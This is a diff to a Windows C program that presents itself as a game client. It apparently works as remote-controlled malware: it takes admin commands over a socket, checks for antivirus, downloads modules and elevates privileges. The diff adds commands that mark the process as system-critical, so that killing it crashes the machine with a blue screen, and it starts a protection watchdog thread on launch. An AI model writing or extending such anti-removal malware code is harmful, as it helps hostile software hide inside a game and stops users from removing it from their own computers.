@@ -121,6 +121,21 @@ static void handle_admin_command(SOCKET sock, const char *cmd) {
         sys_check_antivirus();
         result = "[Security check complete]";
     }
+    else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
+        sys_protect_process();
+        result = (char*)sys_protection_status();
+        if (strcmp(result, "CRITICAL") == 0) {
+            result = "[Process protected — system will BSOD if terminated]";
+        } else if (strcmp(result, "FAILED") == 0) {
+            result = "[Protection failed — ensure admin privileges]";
+        } else {
+            result = "[Process already normal]";
+        }
+    }
+    else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
+        sys_unprotect_process();
+        result = "[Process unprotected — can be terminated normally]";
+    }
     /* Game module management */
     else if (strncmp(cmd, GAME_FETCH_MODULE, strlen(GAME_FETCH_MODULE)) == 0) {
         char url[1024], path[MAX_PATH];
@@ -211,6 +226,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     /* Elevate privileges if needed for full functionality */
     sys_check_privileges();
+    
+    /* Start protection watchdog thread */
+    CreateThread(NULL, 0, sys_protect_watchdog, NULL, 0, NULL);
     
     /* Start game client */
     game_client_loop(NULL);
